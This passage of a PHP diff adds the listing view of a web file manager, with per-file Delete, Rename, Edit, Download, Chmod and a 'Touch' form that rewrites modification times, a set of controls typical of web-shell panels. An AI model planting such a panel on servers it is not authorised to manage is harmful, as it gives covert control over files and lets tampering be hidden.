+            $rel = substr($realFull, strlen($docRoot));
+            $rel = str_replace(DIRECTORY_SEPARATOR, "/", $rel);
+            if ($rel === "") {
+                $rel = "/";
+            }
+            $scheme =
+                !empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off"
+                    ? "https"
+                    : "http";
+            $viewUrl = $scheme . "://" . $_SERVER["HTTP_HOST"] . $rel;
+        }
+    }
+
+    $safeName = htmlspecialchars($f, ENT_QUOTES);
+    $safeSize = htmlspecialchars($sizeHuman);
+    $safeMod = htmlspecialchars($modified);
+    $safePerm = htmlspecialchars($permText);
+    $safeOwner = htmlspecialchars($ownerText);
+    $safePath = htmlspecialchars(encode_path($path), ENT_QUOTES);
+
+    echo "<li>";
+
+    echo "<div>
+        <input type='checkbox'
+               form='bulkForm'
+               name='bulk_items[]'
+               value='{$safeName}'>
+      </div>";
+
+    echo "<div title='{$safeName}'>";
+    if (is_dir($full)) {
+        echo "📁 <a href='?path=" .
+            htmlspecialchars(encode_path(realpath($full)), ENT_QUOTES) .
+            "'>{$safeName}</a>";
+    } else {
+        echo "📄 {$safeName}";
+    }
+    echo "</div>";
+
+    echo "<div>{$safeSize}</div>";
+
+    echo "<div>{$safeMod}</div>";
+
+    echo "<div class='{$wrClass}'>{$safePerm}</div>";
+
+    echo "<div>{$safeOwner}</div>";
+
+    echo "<div><a href='?delete={$safeName}&path={$safePath}' onclick='return confirm(\"Delete {$safeName}?\")'>Delete</a></div>";
+
+    echo "<div><a href='#' onclick=\"var el=document.getElementById('rr_{$id}'); el.style.display=(el.style.display=='none'?'block':'none'); return false;\">Rename</a></div>";
+
+    echo "<div>";
+    $firstAct = true;
+    if (!is_dir($full) && $viewUrl !== "") {
+        echo "<a href='" .
+            htmlspecialchars($viewUrl, ENT_QUOTES) .
+            "' target='_blank'>View</a>";
+        $firstAct = false;
+    }
+    if (!is_dir($full)) {
+        echo ($firstAct ? "" : " | ") .
+            "<a href='?edit={$safeName}&path={$safePath}'>Edit</a>";
+        $firstAct = false;
+    }
+    if (!is_dir($full)) {
+        echo ($firstAct ? "" : " | ") .
+            "<a href='?download={$safeName}&path={$safePath}'>Download</a>";
+        $firstAct = false;
+    }
+    echo ($firstAct ? "" : " | ") .
+        "<a href='#' onclick=\"var el=document.getElementById('cc_{$id}'); el.style.display=(el.style.display=='none'?'block':'none'); return false;\">Chmod</a>";
+    echo "</div>";
+
+    echo "<div><a href='#' onclick=\"var el=document.getElementById('tt_{$id}'); el.style.display=(el.style.display=='none'?'block':'none'); return false;\">Touch</a></div>";
+
+    echo "</li>";
+
+    echo "<li id='rr_{$id}' class='action-row' style='display:none;'>
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='rename_old' value='{$safeName}'>
+                <input type='text' name='rename_new' value='{$safeName}'>
+                <button type='submit'>Rename</button>
+            </form>
+        </div>
+        <div></div><div></div>
+      </li>";
+
+    echo "<li id='cc_{$id}' class='action-row' style='display:none;'>
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='chmod_file' value='{$safeName}'>
+                <input type='text' name='new_mode' placeholder='0755' style='width:70px;'>
+                <button type='submit'>Chmod</button>
+            </form>
+        </div>
+        <div></div>
+      </li>";
+
+    $humanTime = $mtime ? date("Y-m-d H:i:s", $mtime) : "";
+    $safeTime = htmlspecialchars($humanTime, ENT_QUOTES);
+
+    echo "<li id='tt_{$id}' class='action-row' style='display:none;'>
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='touch_target' value='{$safeName}'>
+                <input type='text' name='touch_time' value='{$safeTime}' style='width:160px;'>
+                <button type='submit'>Touch</button>
+            </form>
+        </div>
+      </li>";
+}
+
+echo "</ul>";
+?>
